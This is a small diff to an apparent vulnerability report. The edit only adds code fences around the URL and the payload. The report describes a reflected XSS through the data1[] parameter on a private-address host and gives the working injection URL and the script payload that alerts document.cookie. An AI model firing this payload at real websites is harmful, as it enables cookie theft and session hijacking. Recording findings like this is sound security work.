@@ -1,8 +1,8 @@
 Vulnerability: Reflected XSS via data1[]
 
-URL: https://192.168.124.130/get-merge-tickets/0?data1[]=10&data1[]=1'><script>alert(document.cookie)</script>
+URL: ```https://192.168.124.130/get-merge-tickets/0?data1[]=10&data1[]=1'><script>alert(document.cookie)</script>```
 
-Payload: '><script>alert(document.cookie)</script>
+Payload: ```'><script>alert(document.cookie)</script>```
 
 Action to trigger: None
 
